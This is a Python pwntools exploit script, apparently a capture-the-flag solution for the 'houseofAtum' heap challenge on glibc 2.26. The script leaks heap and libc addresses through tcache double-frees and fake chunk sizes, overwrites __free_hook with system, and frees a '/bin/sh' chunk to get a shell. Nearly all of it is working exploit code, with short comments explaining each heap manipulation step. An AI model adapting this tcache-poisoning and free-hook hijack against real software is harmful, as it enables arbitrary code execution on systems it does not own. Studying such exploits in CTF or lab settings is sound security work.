from pwn import *

io=process('./houseofAtum_debug')
libc = ELF('/usr/local/glibc-2.26/lib/libc-2.26.so')

def build(name):
    io.sendlineafter("Your choice:",'1')
    io.sendlineafter("Input the content:",name)
def edit(idx,content):
    io.sendlineafter("Your choice:",'2')
    io.sendlineafter("Input the idx:",str(idx))
    io.sendlineafter("Input the content:",content)
def show(idx):
    io.sendlineafter("Your choice:",'4')
    io.sendlineafter("Input the idx:",str(idx))
def destroy(idx,select):
    io.sendlineafter("Your choice:",'3')
    io.sendlineafter("Input the idx:",str(idx))
    io.sendlineafter("Clear?(y/n):",select)

def leakheap():
    global heap_addr
    build('A') # chunk0
    build(p64(0)*7+p64(0x11))  #chunk1
    destroy(1,'y')  #chunk1 freed to tcache       
    for i in range(6):
        destroy(0,'n')#free chunk0 6 times, chunk0 is freed to tcache and next pointer pointing chunk0 self
    show(0)
    io.recvuntil("Content:")
    heap_addr=u64(io.recv(6).ljust(8,b'\x00'))
    log.info("heap_addr:"+hex(heap_addr))

def leaklibc():
    global libc_addr
 
    destroy(0,'y')   #free chunk0 once more,and chunk0 is freed to fastbins
    build(p64(heap_addr-0x20)) #chunk0 from tcache
    build('B')                 #chunk1 from fastbins  
    destroy(1,'y')             #chunk1 freed to fastbins
    build(p64(0)+p64(0x91))    #fake chunk1 from tcache ,set chunk0 size to 0x91
    for i in range(7):
        destroy(0,'n')         #free chunk0(size 0x91)7 times,make full of 0x91 tcachebin
   
    destroy(0,'y')            #free chunk0(size 0x91)once more,free chunk0 to unsortedbin
    edit(1,"A"*0xf)
    show(1)
    io.recvuntil("A"*0xf+'\x0a')
    libc_addr=u64(io.recv(6).ljust(8,b'\x00'))-0x3abc78
    log.info("libc_addr:0x%x"%libc_addr)
    
def pwn():
   
    #one_gadget = libc_addr+0xdd752
    free_hook_addr=libc_addr+libc.sym['__free_hook']
    system_addr=libc_addr+libc.sym['system']
    log.info("free_hook_addr:0x%x"%free_hook_addr)
    log.info("system_addr:0x%x"%system_addr)
    edit(1,p64(0)+p64(0x51)+p64(free_hook_addr-0x10)) #modify chunk0's size to 0x51,write free_hook_addr-0x10 to chunk0
    build('AA') # chunk0(size 0x51) from fastbins ,although tcachebins (size 0x91) has seven chunks
    destroy(0,'y')# free first,because there has already been two chunks.free chunk0 to fastbins
    build(p64(system_addr))# chunk0 from tcache, write system_addr address ioto _free_hook address 
    #io.interactive()
    destroy(1,'y')   # fake chunk is freed first,because there has already been two chunks 
    build('/bin/sh\x00') #chunk1 from fastbins
    gdb.attach(io)     
    pause()
    io.sendlineafter("Your choice:",'3')
    io.sendlineafter("Input the idx:",'1') 
      
    io.interactive()
        
      

if __name__ == "__main__":
    leakheap()
    leaklibc()
    pwn()



